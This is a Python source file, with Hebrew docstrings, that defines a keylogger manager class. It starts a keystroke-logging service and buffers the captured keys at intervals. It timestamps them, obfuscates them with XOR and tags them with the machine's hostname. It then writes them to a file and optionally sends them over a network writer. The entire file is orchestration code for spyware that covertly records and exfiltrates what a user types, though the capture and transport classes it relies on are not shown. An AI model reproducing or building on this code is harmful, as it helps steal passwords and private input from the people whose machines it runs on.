import time
import socket
from datetime import datetime


class KeyLoggerManager:
    def __init__(self, keylogger_service, file_writer, encryptor, network_writer=None, interval=5):
        self.keylogger_service = keylogger_service
        self.file_writer = file_writer
        self.encryptor = encryptor
        self.network_writer = network_writer
        self.interval = interval
        self.buffer = []
        self.running = True

    def collect_keystrokes(self):
        """אוספת הקשות מה-KeyLoggerService ומאגדת ל-Buffer"""
        keystrokes = self.keylogger_service.get_logged_keys()
        if keystrokes:
            self.buffer.append(keystrokes)

    def process_and_store_data(self):
        """ מעבדת את הנתונים, מוסיפה חותמת זמן, מצפינה ושומרת"""
        if self.buffer:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M")
            data = "".join(self.buffer)
            processed_data = f"[{timestamp}] {data}"
            encrypted_data = self.encryptor.xor_encryption_and_decryption(processed_data)

            machine_name = socket.gethostname()
            self.file_writer.send_data(encrypted_data,machine_name)
            if self.network_writer:
                self.network_writer.send_data(encrypted_data,machine_name)

            self.buffer.clear()

    def start(self):
        """ מפעילה את KeyLoggerManager בלולאה"""
        self.running = True
        self.keylogger_service.start_logging()
        while self.running:
            time.sleep(self.interval)
            self.collect_keystrokes()
            self.process_and_store_data()

    def stop(self):
        """ מפסיקה את האיסוף והרישום, ומבצעת שמירה אחרונה של הנתונים"""
        self.running = False
        self.keylogger_service.stop_logging()
        self.process_and_store_data()

